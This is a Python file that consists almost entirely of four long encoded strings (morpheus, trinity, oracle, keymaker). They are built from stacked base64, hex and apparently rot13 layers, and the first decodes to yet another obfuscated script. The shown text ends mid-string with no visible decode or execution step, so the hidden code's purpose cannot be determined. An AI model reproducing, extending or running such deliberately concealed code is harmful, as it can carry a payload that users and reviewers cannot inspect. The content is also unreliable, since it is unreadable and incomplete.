import base64, codecs

morpheus = 'aW1wb3J0IGJhc2U2NCwgemxpYiwgY29kZWNzLCBiaW5hc2NpaSwgc2l4Cgptb3JwaGV1cyA9ICc2NTRhNzk3NDU3NmM2Yzc2MzQzMDY5NTM2NjcxMzk2NjMwNTczODMxNjc3ODMwNzM2NTQ1Njc2NTQzMzk2ODVhNDk0NjU3Mzg2YjZkNGE0YjcwNmI2ODRiNTk3MTRhNjY1YTQ2NzE2ZDc4NTU0ZDY5MzM1YTRhMzUyZjUwNzIzOTQ5NmQ2YzU4NjQ1MzM4NDcyYjM3NTI2ZjQ3NDI1MzVhNTY3ODc4NjY1MjRmNTE1ODMxNjU2NTM2NzU2MjM3NjY2NjZlNzMyYjJmNmU0NjM2NmQ1MDMzNmE3NDJiN2EzNjYzNzM3MjJiMmI1MDYxNzQ3NjcyMzQzMzYyMzY2NjM3NDgzNzJmMzkzNjM3NjY3Njc4MzczMzY1NTA1YTc1MmI3ODZjMzMyZjRjNTQ0ZDUzNTkyZjMyNmE3OTMwMzkzMTMzMzY1NDZlNGM2YjJiNGU1MjUzNmUzMzM2N2E0ODM0NzM1NDc3NjYzOTMzNGY0ZDcyMzU3NDZhMzE0ZjU3NWE1NTYzMzEyYjM1NGQzMDRlMzYzNzcxNmE3NTM5NGY3YTY3NTMzMzM0NDQzNDdhNDczMjM3NjYzMTU3NGE3MDcyNGI3YTQ4NTg0Yzc2Mzc2OTYyNTMzMzQ3MzA0NTY5NGM0NjRjMmI0NjczNTMzNzUzNTg3NDU0NjM1ODQyNjYzNDM3NjU0OTc2Nzg3Njc2NDkzOTQ1MzA3MzM5NDg1NzYzMzQ2MjczMzg3Mjc5MzI3NTc5NTQ2OTYzNTkzOTM0NmY2OTZkNzg2MzM3MzIzMTRlNTc3NDZkNzc3NDZhNDk0ZTM2MmY1NDMxNjk0ZjYzNmY1MjZlNzE0YjU1NTY2MTMwNmU3ODY3NTQ2YjM4MzQ1MjYzNTQ2OTc1Njk3ODdhNmU1OTQzMzg3MjMxNTU1NTUyNTk2NzM0MzM3ODQ5Njk3YTc4Njg1MzcyNzM2ODZlNmIzMDc0NDkzNDZkNjEzMDRjNzI0YzUwNzc3MjRmNmIzNzM5Njk3NDczNTQ1MjUyNjk3NDZjNjI3OTM3NzQzNzU3NGU2NDY2NTg0Njc1NTE3MDUzNzU3OTU0NjQ0YzU0NzY0YTc0Mzc2OTUwNjM2NjYzNjQ0ZDQxMzg0NTM5Mzg2ODUzN2E2ZDZiNDI2NjVhNzg0MjY1NTQ0ZjQ0NGE0YTZlNjczNzUwNTg1OTMyMzY2YjczNWE2NzRjNTA0NTU3NjMzNjRhNDI1MDQ2Nzk1NDU0Nzk0YzU3MzA0MzQ3NjQ0YjRhNjc3NjZlNDc2YTYyNzM0OTRkNzQzMTRjNjQ1MzM0NzM2YzJiNjM2NDRhNDE1NjRmNjc3MjRkNGI3YTQ3NGYzOTVhNDI2ZTU5Nzk2YjM5NzM0MzM1NTI1NDJiNjk0ZTJmNjU3ODQyNDY3MzZjMzgzNzYxNjI0Nzc4NmY0YzYzNjUzOTczNTU1YTRkNzMzNDMwMzI1MjQyNmQ2NzZiNTQyYjY4NzEzMDZhMzc1MjY1MzM2YTQxNjYzMzJmNzc3YTM3NDczNTc1NTk3NTY3NTI3MDM5NzI0NzQ5NzQ3NTU0NzI2NTZhNjM0NTc2NGMzNzM1Mzc1NTYxNjgzMDJmNDg0ODRmNzY0YTY2Nzc3YTJiNmI0NzJiNTE2YzMzNzczNTY4MzkzMzMwNjQ1MTQ1NjYzMTdhNjI2ZDQzMzE1MDVhNjM0NTc4MzYzNzQxNjYzNzc3NDIzNDc4MzU0MzM5Njc2YTM5NDc0NzZhNjM0OTM1MmI1Mzc1NGU0ZDMxMzM2ODQ5NTM2MTM3NGQ2NTY3NzI2MTJiNjk2OTUxNTEzNzU5NmEzMjc1Nzc1MjM0NjYzOTY0NTc1NjZlN2E0YTQ1NTc3YTZmNmQ0NjRhNmQ0OTRhNDg0ZTZlNmI1ODM4Nzc2ODY2NDk1NzU0NjY2MTQ1NDg2ZTYyNGY0YTQ5NWE2MzcyNzg2ZjMxNDYzNDMyNTI1ODU3NTc0MTM5MmI2MTU2NjY3NTc5NDU2YjUzMzg2OTU3NmQ0YTJmMzI2MTM4NzU0NzQ4NGU3NTRiMzg0MTY5MmY3YTUwNDU0Zjc1MmI0NjYzNGI3ODMwNDk3MDM0NTI0ODJmNDE1OTRmNjg0NDM3NGU0MTM1MzU0NzczNmE2NTQ4Mzc0OTUzNTA0NjUwMzU0YzY0NGQ2ODRjMmY3MDY3NDQ0NDdhNzI2YjRiMzQ0MTZlN2E0ZDJmMzY3OTUyMzU2MjJiNDQ0ZDc4NWE0YzQ3NzQzMTM1NDE1YTM5NmE0ZjQxNGEyYjQzNGMzODRkMzU2ODU0MmY0OTc0MzA3ODUxNDc2NzQyNzY0MzQ1NzU3NzQ0NmU1MTUyNzc1NDc2MzQ0YTM2NjE2YjcyNmU0OTM0MzUzNzQxNzczNzc1NjQ0MzJmMzI0MjYyNzIzMDU5NWEzODQxNzY3NTU1NmI0MzRmNmE3NTQ5NDczOTQzNGYzOTQzMzQ1YTdhMzg3NDc4MzQ2YzJmNGE3NjQzMzMzOTY5NmU0MjZiNWE2OTc4NDEyZjMwNTE2Njc4NmY1YTRkMzkzMDcwNDQ2NzRhNDQ1NzU1MzMzMjQ1NjE2ZjMyNDU2ZjY3NDgyZjQyNjU2YjdhNzkzMDRjMmI3ODUxNjg0NDMzNjg0MzUwNmE2ZjU2NTg3NzUzNjg2ZDQ3NGM2YzRmNzc1NzQ5N2EzNDY4Nzg3YTcxMzI2NDUyNTczMzQ2NGYzODQ2MmY0MjdhNjI1YTRkNjM1MjY1NGU1MzU1MmY2YzU5NGE3NjU3NDI1MDM4Njk1MDQ2NTMzMDQ3MzQ2ODUwMzk3MTUxNjYzNDVhMzQ1NTc2NDU1NzM0Njk1OTRjNTM0NTUwNmU1YTYzNDQ1ODM3NzMzMzQ2NTM2MzcxNDQ2YjcyNjc2ZDJiNGI0MzY0NGQ0ZjJiNjM1MTM2Mzc3NzUxMzU3NTUzNTAzNDcwNDk1NDJmNjk0NDc2NjE2ODRmNDM1NTJmNDE2NTc2NTM0OTcyMzk1Mzc2NDM0NTY2NTU1NDM2Njg2NjQ1NDIzNDRhNTg3NDQxNjI3MDc5NDQzODVhNTQ3MzU2NDE0MjJmNzc1MDU4NGM0NzM5NmI2MjY0NmE0MjQ5N2E2ZjMzNzk1NDMyNjI1MzRmMzg2ZDQyNTA0NTRjMzU0MjQ4Mzc0ZTRmNzU2NzRhNjUzNTRhMzg2OTQxNjM0YzMzNzg1NjZkNzM0NzJmNDI3MzUxMzczNTYxNDc1NDU5NDkzMTUxMzQ2ZjUwNjk0NTc2NzI2ZjYxNjgzNTc5Nzc0ZjM4NTc0ODU0NmU2NzU4Nzk3NjJiNzc1MDMyNzk3NzczNTc1MTQ2NjU3NzQ2NTA0YTQ2NGU0OTc1NGEyYjc0NTM1YTYxNTIzNDY3NzY3OTU3MzMzNjc0MmY0YjZlNmI2NzRkMzA0YjU5NTY0OTY1Nzc3NjZkNzc0ZDMyNDc0ODYzNGI3MjZiNDc1MzZlNjY1OTYyMzk2OTZiNmE3NTZjNGY0YjRlMzE2OTQ2NjY0NTcwMzA1ODM1NjkyYjc5NjE1NTY3N2E0MjdhNzU1MTQ4NmQ3YTQ0NTU0NTUyMzQ2YjMyNjE3NTZkMmY0OTUyMzg1YTc5NDg3NjZiNGEzMDcwMzUzOTQ5MzczODY3NDY2YjU1MmY2YjQ1NGY3MzJiNTU2ZTMwNjI2YjczNWE3MjMwNzgzMzc1NjgzNzQ2NmI0NDcyMzc0MTc2NGQ0MTUzMzc0OTM0NjY1MjQ3NTk1MjZlNmU1NDQzMmI2OTVhNGY2NTM1NzM0ZjU4NTA2NTUxNjc0ODUwNTUzMDQ0NzIzMDRlNjk2YjRmNzM3Mjc5Njg1MDUxMzgzNDUzMzg3NzY3NTA2YjQzMzE1ODc2NzM0MjJiNzc0NDJmNDY0NzJiNDU3ODQ4NWE0MTUwNDU2MjJmN'
trinity =  'Qx3ZQquAGt2BQEwATRmZGH0AzH2AQL4ATD2AGH2ATH1BQWvAQZ2BGDkAQHlMwL5ATRmBQL4AGt2BGL2AQH1LGZ1AzD0MwHmAzZmAmp5AmN2Awp3AmxmAGpjAQR1BQZkAzR0ZwMyAmZ2BQHjAwx2LGWzAGx0AQWzATV3BQZ0ATZ3AmHmAQD2LwZlA2R3AGLlAzV1ZwZ4AGR3ZwZ4AmN0Mwp0Zmp0BGL0Zmx3ZQp2AmN2BQDmAGLmZwp0AGRmAmp3AQZ0Lmp5AmR3AGH1ATV2ZmMzATZ3BQL3AmRmZmp4AGp1AGL0Zmt2MGL2ATR2AwMvAwV2AGLkAwH0AGZmAQtmAGEyZmt1BGZ2ZmLmZGMwAQtlLwMyAmL0LGH2AQD3ZQp4AQV2ZwZ0AmD2BGD1Zmp2ZGpmAQZ2AGHjAGR0AwWzAQx2AmZmZmN0AwL1AGx0MQL5AwRmBQpmAmN2ZGp4AGRmZmL4AQVmZmEzAwt1ZQZ4ZmL2ZmMvAGxmZQpjAmNmZGD5AwH1AGp2AQp0LwL1AQV0MwH1AmL3BGMyAwH1ZwplAQxmZGL3ZmZ3AmZ0AGLlMwMxAGLmAQL4AmVmZGD0AmV2LwL1Zmt3BGMwAGN0BGH3ZzL2BGH0AQp3AQLlATV0LwquAGZ0BQWvAGV2AQH1ZzL3BGL5ATR2AmL5ATV2MQp3ATZ2MGH1AzLmAQL3ATLmBQL0AzV0AGZ0AmN1AQHkAGDmAwMvAwH2LmL4AGR2AwpjAGN0AwH2AmtmZwDlAQt3ZQDkAQD2AGL3ZmZ0LwH0Awx2Mwp1AwZ3ZmplAmL0AmplZmZ1AQL2AQH0AmZ1ZmHlMwp1ZmZmZwWzAmLmAGLmAmVmAQEyAmH0BGD4ZmtmBGp0ZmV1AwEuAwH3AQp1Awt3AGp5AzV3LGplAmN2AGIuZmV0AGquAGxmAmD2AGL1ZmZ5AwH3ZwH3AwDmZGplAmZ3AwExATV0MGMwAmN2MQZ0ATH2MwL2ATZ0ZGZ2ZmN3AmEzAGLmZmH3AGD2AGD3AmV0ZGEzATDaPaElnJ5cqUxtCFNtW0biF0L5p1SiZQS4M1teo2uaJR9yHUIAnKSSLIu6LxgiEzSUA3uZFxjjXmNiGIDkL2IKJyADoRclpvgfZ2b3D0IhFF9wG2IXrP8jIxZeZySjM0MDD003IwM6JIAbGJcSnRuFIzuRZR9PA1EnoSZenKSMpxMDIIEGnJMnAyOILwWCAlgvBSAbJKR5E09Ppwxmnwq6IGABIIqCqmt2HII1o3cZrF9TElfkJGZlISSPMR8kpySAoHyxBQSyHTq0H21eI002oTIBAQAWDGWQL0EvX0kmryb4nIEuHSASZ0W0FJkdF0DlpGAJomOOIxIyrHgJrTt5qQycrRSXnQWkpHkFqxfmMKZjp0cEZTIDF0b5LKEQIyEzHHWZDytkE2qOqH9iDayjpzSvZGSkY1IuFyqcZ2q1A0VeA0jmFmugF25gqv9IM2Izrwy5rUbeAJcAMmy4rGM6pzZ3nTSMX1x1MzgvIP9lY3ugEmMMpwyxD0MSrxb2q2WbHGZlZQD3AT5Fnl9bFKOKrJcJY2M3ZKS4XmMOqyEiY2SZpzWQD2qyoREjp2SnnwqhZUAYA3EzpwDlFRcSoyL2XmxjpGH3LxI3GSuyL3AOI240p295nGAEoyOWZzIinSWmpycYLwD2D2gIASAuLGSaZIIGAP9kJHp5oUc2qyyyq3pmLaukD21SqwIWnwqMnQyIISI0owA2FRuxHJ4lAUSPImu2pRuyZQSxAGyIGQR1DxZlpxVeGIZ2FxcaLKMWY3yCGHcuEGAmpJj4Y1c1ZzuvqKAWBKc5ZxuAAmETBKcxpKuZBSEdqGAGnH8iFRu5pwuaZTSeGTSZE2klGzp0rz9Mq1yvJwumo0ZmnRbiAPgkZzA6F3pjA3OYEzIkImAGnwMWLJySDyxjHJ9ApPgcoGqHI2uUozq3oR4irJkgF3N5IwWmDmucG1I5ZTydqKt3BPgMn21IF2ylBKSkoGAEDaIgZIE6o0yxZ25co1DjZwDmZJj2BKSuEGIwFUN3BIyxAmAzEKMbJTDlZxA3EGH0nwu4MTMDH2yEZ3AmoRkMrKMIZTpmFGqVXmuPERAOMH9RDKOlpGq6AH1KImN4BF9unQqBZHIhFzRmoHZ1ARAiFyEWE29IM3cBBRWuDJtmnmZeF1AcIJ9JFaOVqJcnp2H0GTb5rIAMHQLmZUA6qwZeMSSFpwOEEQD5GyLlo0gjIKL0BSEDX3SLDKO3HxA5IHVjFJH2Jzt4DKuRq1yloJ9Xozk2GRAxDzIMJUqiFQI2n3R5LyEmZJcRn0W5LGt3DwOApxgzJQRmnUHlJHymZ1ZeHH5ELJgeASOIF1SzozIeLHxlp3p5IUD1nJc3BHL0nGOyBF96LmR3GScOJIS1oyI2BKq4o3AlZ2SIBKcjHwuQFGu6FvgQqzMwMGRlGHW5A0Mzpwt0ZmAaDx8lLJgXL1WjFxcOAHIOMzDlnGuAZQIcLmE3oJpiMaumDzIQZ3LeBGA0HQAxJGZ0AwAfEJZ2BUReZyIIHxIwX29bJUuWn3WmLyD4rTScM3NkMKAPZacVLKcQoaDkD29gAQqXBJIhF3qjnHyarzERDx8lM1xlIQqIA3qeHUcGnRgvDHynIHZ1I2HmoSyJo2qYHPgnBIcEp05dBJL2A3plMQyjHmuHpxuCLGI4Izx5LayypJR3oTL1BQSlo0yUG3ulBF95MQWEZHgDIF9iEzcuEmIbn1ALAzf0HySwZ0WaZKZ0rwEkE2EFGmMkpTcyLaywATV1pGL3IRAMHJImF25aIwu2nJSfBISVY1x0IKMEXmIzZ1uIMQpeY0VmpJLiEzIbFF82Y0Z1ZyImD0xkpQymFzEnBHgWGQqgowIiF29vEzM0AxH0JQOWX0AQExA6GULjJIquZwuuA0yCXmWMGQyfnmWBp2qzA1udJIN3MT1hBQuZqmR3BGSkIaD1ZTAIMJR2rRt2D2kMLFg0nFgQrz9JE3AkHxIupwq3pTuuMQt5ITfkrzMIGaAZq3ObIJ41FP9aIxV5rUZ3pQtioIA2AT0kZzEuoTAQFmq6ERSApyOLMUDmIJyynHukDz8eZRIZZxRiHaS0o1yGoUplM3EPIJAADzyupwOUpySHGz9MJwyzF2HlLxVjD1WlIRWXnyN3F29cqQMRrGIHLHDmAaZ4qmA5omyRGwAEZxExY1WkpKOmGQEvrwMFF2y6FIWjHRqYEGDkMaEnFyL5BT52n1SHY2ShZTAAqKV4pHp1FwAVG3Oyo0cJnGAEnUWnDvgUMH5PM3yGF0EXGUcDIJZ2p1qnFR9knaAfEUO3Z2kkG3I0nHqkLGAiGHckESAQZISFE3SYDzEEnmAWIJuTMKOVpGShGxkAJSbeE1IDGHpepmWHpQplL0IyLGEOMSq6qHySD0AJZ2ELX2A1oKSSBQqOLKIaZ2qEZ3AUGxLeG3A5ZzI4H2yVIGyYL1V3oyShZP9XERtkJKSdIJIVM0gxJKW0JwH0nmAxHaR3IFpXo3WuL2kyVQ0tWmMyAGx2MQZ2AGD3ZwH1AGtmBGLkZzV3ZQp5AQRmAQZ0ZmRmBQDlZmL2AwH5AzH2ZGp3Zmt1BGp0Zmx0AmMwAGR1AQZ2AzDmZwHkAwpmAwpmAzVmZGHkAwL1BGZ2AmN2LGH4AzL2MQZ2AGV1BQpjAGp3ZGExAmZmAQD4ZzL0MGplAmR3AwL2AGp2LGEzAmR2AwH2AGNmAmIuAQp2LmH0ZmZmAwH2ZmL0ZGEzAzZ1LGEzAwZ2LmD2ZmxmAmLlAQH3AwWzATH1ZwZ5ZzLmZmIuZmx1ZQZlAwV1AwL5AGt2MwL3AwD0ZmHjATD2BGD5AzH2AmH2AzL1ZGLlAQLmBGZjAQZ3AmHmAmx0BGpkAGR2MGD2AmH0ZwMvAmt0MQH2ZmZ2AQMvATH1AQZmAwt0LGMuAzR3ZGDlAwp2MwZmAGV1AQDlAQH0ZwH4A2R3ZGD5AzV1LGZ0Aw'
oracle = 'E1OTU5NTU3NzY1NDQ2Mjc1NmI2ODRkNjU0YjM1MzY2YzQyNTEzOTM2NGQ2ZDM5NmY1MzYyNGQ2ZTU1NTczNjQ2NWE0ODYyNGM1YTQ5Njg3MTZiNTQ1MTQ5N2E0MTc4NmYzMDUwNzQyZjU0NTk2ZTZkMzU2MTU5NGQ0YjQzNjI3NDUyNjczMjU5NDk1OTY5NTM3NDRkNzg1NzZhNDEzNTRmNjk0NzcxNmQzNzM0Nzg0NDY4NDgzNjZjNTM2ZjYyNjc0ODY0NmY0NTc0Njk0MzY4NGU1NDZmMmIyYjM0NDU1OTM2NGI1NTUzNzQ0NzQ5NDU2YjY2NjQ2MjRkNTc3ODRkNTQ2ZjM1NzE3MDUwNGUzMDU0NzE1MzRjNDI1MDQ2Njc3MTQ3NTQ0ZDc5NjE1NzRiNmQ1MzcwN2E1MjQ5NjY3MzU2NzM0YzRjNzA2NDM0N2E2ZTUzNmE2NjUzNGMzMDYxNmI2MjQ4MzgzNDcwNjM1OTUwNGU0NDRkNTY0NTY5NjI0NjVhMzY3MzYxNmY0ZjZhNWE0YjY2N2E0MjZiNGQ0MzUxNzc1MjU2NzY0YTU0N2E2NDUxMzM0YTRhNzg0NTM4MzY0YTZmNTgzMDc4NjQ2MjcyNzg3NzM2MzQyYjRkNjI3MjcwNDI2NzdhNDc0YTM5NTg0ZTZlNjg2NzM1NjI3NjZmMzEzMzVhNzE0YTM0NjE3NjM1NDI3NTMwNDg1MjcxNDIzOTMzNzA2OTcwNTU3NzQ1MmYzNzRiNjc1NDUyNTQ2NDU0NmE1NDZmNmE2YjZlNzc0MjUyNmE2Zjc4NmY2ODQ5MzM1YTZkNGE3OTc4NGI1Mjc4NmY3OTM3NDk1MDZmNzE0YTU5NDQzMjU5NDQ3NDZiNjU0NDQ5NTA0ZjU0MzQ2YjY4MzEzODU0MzQ1MzU4Mzc3MTM5NDY0MzZlNGI3MTQ1NjIyZjVhN2E3MzcxNmE3MDU1Nzg0NjUzNGE2MzYzNTE0YTY0NTY1Mzc3NTAzNjZmNjYzMzU5N2E0MjY0NDY0YTY5NDU0MTU2MzE2MTQ3Njg2NTRmNmE0NTYzNzc2ZjRlNDY0NDRlNDk2ZDMzNDY0ODQ4Njk0NDcwNmI3NzQxNDg0ZjZmNTEzNTQ2NTg0ODM0Nzk2MzU3NGI0NTJmNzM1NDZiNTkzOTZhNGE1NDYyMzg3NzQyNjI2ZDMzNzg0MjY3MzEzOTU2Mzc3NzY5NTk0NjU5NzU0ZTZlNDg3MTc1NGQ3NzU0NmY3OTc3NGE0ODc4NzE3NTRjNmI1MDQzNzQyYjQ1NDk2NTcyMzA0NTRjMzc0OTM3NmU0NTRhMzU2ZjU3Mzk2MTc1NmY0ZjU1NTQ2MzRlNjU2YzUwNDg1MjQ0NDc2NjU2NDg1ODZmNjg0ZjcxNjczMjQ5NjI3MTUyNjg1NzYzNzU2Nzc5Nzc0MzM5NmI1OTY0Njk0ODRkNDY2NTUxNDQ3ODU3Njc0YTMzMzc0MTM3NTk1NDcxNDQ2ZTMxNTI0ODdhNTY0MjM2Njc0NDQ3NGI1NDM0NTk2NzRjNjU2ZjUxNjg0MjRkNTQ2NDdhNDU2NjcyNDg2OTc0NjY0NTU5NGQ1NjY1NmM0ODZhNDI1NjMyNTU1MDZmNjE2OTY5NDY1NDRhMzQ0ODRmNGIzMjY4NTAzMTY0NGQ0MzQ4NmY0NTUwMzY2OTYxNzA0NDZkNGE0YjdhNDc2NzY3NWE2ZjM0MzQ0ZTYxNmI0NDQ5NzE2OTdhNGU2ODQ5NmE2ZjU1MzQ0MTM0NTk3MzM2NTU0MzQ2MzE0YzQ3Njg2MzZlNzg2NzYxNzk1OTZlN2E3MTQxNGU1ODY3NGE0ODUzNjU1NzU0NmU2YjY2Nzg0YzQ0NDkyYjU5NjU1NTY4NGQ2YTdhNmY0MzU5NDg3MDYzNTYyZjY3NTk3Nzc5Mzk2MzY2NTg2MTY1NzE0NjRkNGE2ZDc5NzM2ZDc1NTY0ZjRkNTU2OTY4NDc1MzRmNzk1NjRmNmYzMjcxNDkzMDYzNzg0ZDdhNDg0ZjUxNmU1NTRlNTM0NzM0Nzc0ZTY1NzA3NzZiNTIzMTQ5NGUzOTU3NDY2Zjc5MzQ0ODY0NjY1MTQ5MzkzNzZmMzY1NjJiNDY3YTM2NmU3MTcxMmY1NTYzMzE0MjdhMzc2OTQ2NDY3MzQ3NGQ1NTY3NzczMDYyNmM1MTZhNGE1OTM2NTEzNDUyMmYzNjZkNDM0Mjc0NjM1NzQzNjM0NTU3NjQ1NDJiNjk0ODJmNDY1MjZiNzczOTUxNzA2NjU4NmQ2YTUwNDE1ODM3NDUzNDRkNmI1YTZiMzI0ZDQ3NzY1OTY5NTgyYjU0NTU2YjYxNDQ0ZjQzNmE0ODMyNmE2ZTQzMzg3MzU3Njc2NjM2NzY1MzZiMzE0ZTZiNDY0ODZiNGU3YTU5NzE0MzMwNDgyYjc5NGE2Mzc4NDE1MDZiNDIzOTc4NTI1MzdhNTc2ZjcyNzk1OTRiNDQzMjcwNjM3OTczNmU3ODZhMzA3MTY2Nzg1NDU1NmI2MTU4MzQ1NTU2MzA0OTM2NzQ2ODQzNGUyYjcyMzQ1YTUzNmY2NTQ2NDU0ZDY0NGI2MzM5NTIzMzQyNGQ3NTc3NWE0MjZhNjk2NzRmNzk1NTU1NzIzNTZhNzY0OTQyNjQ1NjYyNGU0MzUxMmI0YjZiNTI3MjRiN2EzNDcxNjgzMjM5NTMzNTRkNTY1NTQ4NzM2MTQzNGY0NDQyMzg1NjUxNzgzNDcwNzY2YzU2NmU2MTJiNzA1MTcxNzI3OTQ2NTA0YzU3MzM3NjdhNzE2ZTRiNmUzNjZmMzgzNzc5Njg3MjcwNDQ3MTRlNzE2ZTRmMzE0OTUyNjYzNjZkNGI1MTY2NzE2ZjZhNDk0YjZiNDQ3MDRiNmU0ZjQyNTA1MTU4Njg0NjJmNjc2ZDY1Nzk0OTM5MzM0ODM5MzE1MjZjNDQ3YTQxNmU0MzQzMzg1NTQ4MzQ2MzY5NjkzNzZiNmM2OTcwNzE3MTQ0NmM0YTZkNzE0ZDJiNDM1MzZlNGU1MTVhNzAyZjY5Njc3NTQxNGE0ZjU5MzU1NTQ4NDQ0ZTU3MzU1MTMwNzg1MTU4Njk0NDYzNTMzMzU1MmI2NDY2NWE1MzYyNjU3MTQ1NmI0NjM3MzIzMTQ5NmM0NzZlNDc3NzU1NjY2ZDZjNjM1NTRiNzc0MzZjMzk1NDY4NDY3MDcxNzE1Mzc5NGUzMTM5NzA0MzU4NTY0NTY1NDU2MjQ1N2EzMjdhMzY2ODYyNTA2YjM3Nzg1MTZlNmI0MjY0NmM0MTY0NDM1YTQ5NjIyYjUyNzczMzMzMzY2YjQ0NmI1MzY5Mzg2MjU2NTQ2NDZmMzQzNDYxNzg1NDU4NTY0YTJiNzI0ZDcxNDEzNzRjNTE1MDVhNjI0YjM3MmY0NDMzMzQ1MTQ4NGI3ODJiNmU0ZjRiNDM0ZjZmNGY3MDU1NTUzMDMyNTk1NDc4MzEzNDZmNTQ3MDcwNDUzNTYxNzA0OTMwNTY3ODY3NGM2ODU4NzU0MTc4NDg0ZDU4NTU1NTQ1NTI2NDU1MzMzMjY3MzkzNjY4NDg3Mzc1MzY0NzRmNTA0ODU3NDU2YzRlMmY0YTRjNmY1NDMzNmE0Zjc4NTc1NDM3NmE0Njc2NzE2ZjZkNmY1NDYxNzA0NDZhMzc1NjRmNjU3MjM4NzE2YjM3NjEzOTQzMzg0MTY4NDUyZjU2NjU1MzU3MzU2ODY1NzI0NTcxNTg3MDY5NTE1MDM0NjYzMjY1NzA2ZjM3NGY2MjUwNjUyYjY0NjQ0ODZlNmEyYjQ2NGM0ODRjNGI2MjVhNmU2YjYyNmUzODQzNDEyYjcwNmI1Njc5NzE1Nzc4Njg1ODY2Nzg3OTY0NDM3Njc2MzU2MzU4NTIzNDYxMzEyZjY5NzQyYjRlN2E1MDU5MmIzMzYyNzAyYjYzN2E2Zjc2NGM2MzM1MzEzMjZmNzA0YzY1NzMzOTU5NTg3MDM5NGI1YTQ4NWE1MDZkNDk'
keymaker = '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